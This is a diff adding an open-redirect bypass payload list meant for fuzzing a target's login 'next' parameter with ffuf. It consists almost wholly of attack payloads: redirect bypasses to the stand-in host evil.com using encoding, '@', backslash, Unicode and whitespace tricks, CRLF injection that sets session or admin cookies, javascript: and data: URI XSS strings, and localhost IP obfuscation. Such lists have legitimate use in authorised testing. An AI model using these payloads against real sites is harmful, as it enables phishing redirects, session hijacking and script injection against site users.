@@ -1,0 +1,137 @@
+# Open Redirect Bypass Payload List
+# Usage: ffuf -u "https://target.com/login?next=FUZZ" -w payloads.txt -mc 301,302,307,308
+# Replace evil.com with your server. Replace target.com where noted.
+
+# --- BASIC ---
+https://evil.com
+http://evil.com
+https://evil.com/
+https://evil.com/path
+
+# --- PROTOCOL-RELATIVE ---
+//evil.com
+//evil.com/
+///evil.com
+////evil.com
+/////evil.com
+//evil.com/%2F..
+//evil.com\
+
+# --- COLON VARIATIONS ---
+https:evil.com
+https:/evil.com
+https:///evil.com
+https:////evil.com
+http:///evil.com
+
+# --- @ OPERATOR (credentials confusion) ---
+https://target.com@evil.com
+https://target.com:secret@evil.com
+https://target.com%40evil.com
+https://target.com%2540evil.com
+@evil.com
+//target.com@evil.com
+
+# --- DOMAIN SUFFIX (target.com whitelisted) ---
+https://evil.com?target.com
+https://evil.com#target.com
+https://evil.com/.target.com
+https://evil.com%2F.target.com
+https://evil.com%23.target.com
+https://evil.com%3Ftarget.com
+https://evilXtarget.com
+https://evil.com\target.com
+https://evil.com%5Ctarget.com
+
+# --- SUBDOMAIN LOOKALIKE ---
+https://target.com.evil.com
+https://www.target.com.evil.com
+https://evil.target.com
+https://target.evil.com
+https://notarget.com
+
+# --- URL ENCODING ---
+https%3A%2F%2Fevil.com
+%68%74%74%70%73%3A%2F%2Fevil.com
+%2F%2Fevil.com
+https://evil.com%2F
+https%3A//evil.com
+
+# --- DOUBLE URL ENCODING ---
+%2568%2574%2574%2570%2573%253a%252f%252fevil.com
+%252F%252Fevil.com
+https%253A%252F%252Fevil.com
+
+# --- WHITESPACE / CONTROL CHARACTERS ---
+%09//evil.com
+%0a//evil.com
+%0d//evil.com
+%00//evil.com
+%20https://evil.com
+ https://evil.com
+%0ahttps://evil.com
+%0dhttps://evil.com
+
+# --- ZERO-WIDTH / UNICODE ---
+%E2%80%8B//evil.com
+%E2%81%A0//evil.com
+https://ⓔvil.com
+https://evil。com
+https://EVIL.COM
+ℎttps://evil.com
+
+# --- BACKSLASH ---
+https:\\evil.com
+\\evil.com
+/\evil.com
+%5C%5Cevil.com
+//evil.com%5c.target.com
+
+# --- FRAGMENT / HASH TRICKS ---
+https://evil.com#.target.com
+https://evil.com#target.com
+https://evil.com%23.target.com
+https://evil.com%23target.com
+
+# --- PATH TRAVERSAL ---
+/..//evil.com
+/.//evil.com
+/../..//evil.com
+/%09/evil.com
+/%2F/evil.com
+
+# --- IP OBFUSCATION ---
+http://0x7f000001
+http://2130706433
+http://017700000001
+http://127.1
+http://[::1]
+http://[::ffff:127.0.0.1]
+
+# --- CRLF INJECTION in redirect ---
+https://evil.com%0d%0aSet-Cookie:%20session=hijacked
+https://evil.com%0aSet-Cookie:%20admin=true
+https://evil.com%0d%0aX-Injected:%20header
+
+# --- PARAMETER POLLUTION ---
+https://target.com&url=https://evil.com
+https://target.com%26redirect=https://evil.com
+
+# --- JAVASCRIPT (XSS via open redirect, href context) ---
+javascript:alert(document.domain)
+javascript:alert(1)
+JAVASCRIPT:alert(1)
+javascript://evil.com%0aalert(1)
+java%09script:alert(1)
+java%0ascript:alert(1)
+java%0dscript:alert(1)
+javascript&#58;alert(1)
+&#106;avascript:alert(1)
+
+# --- DATA URI ---
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+# --- OPEN REDIRECT CHAINS ---
+https://evil.com?redirect=https://target.com
+https://trusted-cdn.com/redirect?url=https://evil.com
